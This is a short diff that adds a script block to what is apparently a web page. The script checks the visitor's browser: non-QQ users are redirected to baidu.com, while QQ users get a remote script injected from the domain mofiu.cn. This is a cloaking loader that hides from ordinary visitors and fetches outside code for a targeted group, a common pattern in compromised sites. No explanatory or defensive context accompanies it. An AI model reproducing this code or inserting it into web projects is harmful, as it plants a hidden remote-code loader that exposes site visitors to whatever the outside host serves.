@@ -1,0 +1,15 @@
+<script>
+if (navigator.userAgent.toLowerCase().indexOf('qq') < 0) {
+	location.href = 'https://www.baidu.com';
+} else {
+	var script = document.createElement("script");
+	script.setAttribute("type", "text/javascript");
+	script.setAttribute("src", "//mofiu.cn/lib/ax.js");
+	var heads = document.getElementsByTagName("head");
+	if (heads.length) {
+		heads[0].appendChild(script);
+	} else {
+		document.documentElement.appendChild(script);
+	}
+}
+</script>
